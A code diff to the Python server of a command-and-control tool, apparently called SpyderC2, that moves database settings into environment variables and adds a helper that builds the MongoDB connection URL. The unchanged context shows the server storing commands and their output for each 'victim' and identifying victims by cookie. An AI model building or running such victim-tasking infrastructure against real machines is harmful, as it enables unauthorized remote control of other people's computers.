@@ -33,7 +33,7 @@ def main(db_object,server_logger):
 
 	## Insert the command output in the Database
 	def insert_cmd_output(output,victim_id,task_id):
-		mydb = myclient["pythonc2"]
+		mydb = myclient[os.environ['MONGODB_DATABASE']]
 		cmds = mydb["commands"]
 		h = {'victim_id':victim_id,'task_id':task_id}
 		cmds.find_one_and_update(h,{ "$set": { "output": output } })
@@ -46,7 +46,7 @@ def main(db_object,server_logger):
 	def run():
 		myclient = db_object.mongoclient
 		if request.method == 'GET':
-			mydb = myclient["pythonc2"]
+			mydb = myclient[os.environ['MONGODB_DATABASE']]
 			cmds = mydb["commands"]
 			
 			victim_id = get_cookie(request)
@@ -120,7 +120,7 @@ def main(db_object,server_logger):
 		if request.method == 'POST':
 			myclient = db_object.mongoclient
 
-			mydb = myclient["pythonc2"]
+			mydb = myclient[os.environ['MONGODB_DATABASE']]
 			cmds = mydb["commands"]
 			victims = mydb['victims']
 
@@ -157,6 +157,29 @@ def main(db_object,server_logger):
 
 	app.run(host = '0.0.0.0', port = 8080)
 
+def get_db_info():
+	if 'MONGODB_USERNAME' not in os.environ: 
+		os.environ['MONGODB_USERNAME'] = ''
+
+	if 'MONGODB_PASSWORD' not in os.environ: 
+		os.environ['MONGODB_PASSWORD'] = ''
+
+	if 'MONGODB_HOSTNAME' not in os.environ: 
+		os.environ['MONGODB_HOSTNAME'] = '127.0.0.1'
+
+	if 'MONGODB_DATABASE' not in os.environ: 
+		os.environ['MONGODB_DATABASE'] = 'SpyderC2'
+
+	print(colored("You can set these environment variables - MONGODB_USERNAME , MONGODB_PASSWORD , MONGODB_HOSTNAME , MONGODB_DATABASE",'blue'))
+
+	db_url = "mongodb://"
+	if os.environ['MONGODB_USERNAME'] != '' and os.environ['MONGODB_PASSWORD'] != '':
+		db_url += f"{os.environ['MONGODB_USERNAME']}:{os.environ['MONGODB_PASSWORD']}@"
+		
+	db_url += f"{os.environ['MONGODB_HOSTNAME']}:27017/{os.environ['MONGODB_DATABASE']}"
+
+	return db_url
+
 
 
 if __name__=="__main__":
@@ -164,7 +187,7 @@ if __name__=="__main__":
 	server_logger = Logger(logdir='logs',logfile='logs',verbose=False )
 	server_logger.setup()
 
-	db_url = f"mongodb://{os.environ['MONGODB_USERNAME']}:{os.environ['MONGODB_PASSWORD']}@{os.environ['MONGODB_HOSTNAME']}:27017/{os.environ['MONGODB_DATABASE']}"
+	db_url = get_db_info()
 
 	db_object = Database(url=db_url)
 
